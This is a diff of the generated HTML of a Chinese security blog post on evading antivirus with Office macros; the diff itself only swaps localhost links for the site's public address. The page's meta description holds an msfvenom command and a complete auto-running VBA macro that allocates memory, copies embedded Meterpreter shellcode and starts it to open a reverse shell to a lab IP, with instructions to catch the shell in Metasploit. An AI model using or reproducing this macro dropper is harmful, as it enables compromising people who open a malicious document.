@@ -23,7 +23,7 @@
 msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.12.129 lport=4444 -f vba -o msf.vba 宏的内容如下：
 #If Vba7 ThenPrivate Declare PtrSafe Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As LongPtr, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPtrPrivate Declare PtrSafe Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPtrPrivate Declare PtrSafe Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As LongPtr, ByRef Dnywi As Any, ByVal Zpxn As Long) As LongPtr#ElsePrivate Declare Function CreateThread Lib &#34;kernel32&#34; (ByVal Ffqss As Long, ByVal Ggwnuq As Long, ByVal Iifiex As Long, Gksky As Long, ByVal Hlnyst As Long, Kmko As Long) As LongPrivate Declare Function VirtualAlloc Lib &#34;kernel32&#34; (ByVal Vnbsa As Long, ByVal Xkoptrnhw As Long, ByVal Kghlzh As Long, ByVal Lppdd As Long) As LongPrivate Declare Function RtlMoveMemory Lib &#34;kernel32&#34; (ByVal Ztmgrm As Long, ByRef Dnywi As Any, ByVal Zpxn As Long) As Long#EndIfSub Auto_Open()Dim Ltw As Long, Eso As Variant, Ytpg As Long#If Vba7 ThenDim Tpgwi As LongPtr, Ivlfxyv As LongPtr#ElseDim Tpgwi As Long, Ivlfxyv As Long#EndIfEso = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,137,232,255,208,184,144,1,0, _0,41,196,84,80,104,41,128,107,0,255,213,106,10,104,172,16,12,129,104,2,0,17,92,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,232,103,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213, _131,248,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,40,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,110,77,97,255,213,94,94,255,12,36,15,133,112,255,255,255,233,155, _255,255,255,1,195,41,198,117,193,195,187,240,181,162,86,106,0,83,255,213)Tpgwi = VirtualAlloc(0, UBound(Eso), &amp;H1000, &amp;H40)For Ytpg = LBound(Eso) To UBound(Eso)Ltw = Eso(Ytpg)Ivlfxyv = RtlMoveMemory(Tpgwi &#43; Ytpg, Ltw, 1)Next YtpgIvlfxyv = CreateThread(0, 0, Tpgwi, 0, 0, 0)End SubSub AutoOpen()Auto_OpenEnd SubSub Workbook_Open()Auto_OpenEnd Sub 使用msf进行监听，之后在word中运行宏即可获得shell">
 
-    <meta property="og:url" content="http://127.0.0.1:1313/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/">
+    <meta property="og:url" content="https://yaphetszz.github.io/posts/%E5%AE%8F%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/">
   <meta property="og:site_name" content="Y4ph3tS blog">
   <meta property="og:title" content="宏免杀分析">
   <meta property="og:description" content="本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！
@@ -45,7 +45,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.12.129 lport=4444 -f vb
   </head>
   <body>
     <header class="app-header">
-      <a href="http://127.0.0.1:1313/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <a href="https://yaphetszz.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
       <span class="app-header-title">Y4ph3tS blog</span>
       <nav class="app-header-menu">
           <a class="app-header-menu-item" href="/">Home</a>
@@ -87,8 +87,8 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.12.129 lport=4444 -f vb
         </div>
         <div>
           <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
-              <a class="tag" href="http://127.0.0.1:1313/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
-              <a class="tag" href="http://127.0.0.1:1313/tags/%E5%85%8D%E6%9D%80/">免杀</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E5%85%8D%E6%9D%80/">免杀</a>
         </div>
       </div>
     </header>
